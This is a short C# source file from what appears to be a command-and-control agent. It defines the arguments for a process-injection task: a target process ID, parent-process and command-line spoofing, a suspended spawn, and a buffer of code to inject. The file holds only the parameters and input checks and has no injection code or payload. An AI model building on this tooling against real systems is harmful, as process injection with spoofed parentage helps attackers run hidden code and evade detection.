using Agent.Interfaces;
using Agent.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Agent
{
    public class InjectArgs
    {
        public int parent { get; set; } = 0;
        public int pid { get; set; } = 0;
        public string commandline { get; set; }
        public string spoofedcommandline { get; set; }
        public string asm { get; set; }
        public bool output { get; set; } = false;

        public SpawnOptions GetSpawnOptions(string task_id)
        {
            return new SpawnOptions()
            {
                task_id = task_id,
                parent = parent,
                commandline = commandline,
                spoofedcommandline = spoofedcommandline,
                output = output,
                suspended = true
            };
        }

        public bool Validate(out string message)
        {
            if(pid <= 0 && string.IsNullOrEmpty(commandline))
            {
                message = "A pid or command line needs to be specified.";
                return false;
            }

            if (string.IsNullOrEmpty(asm))
            {
                message = "No buffer provided";
                return false;
            }
            message = String.Empty;
            return true;
        }
    }
}
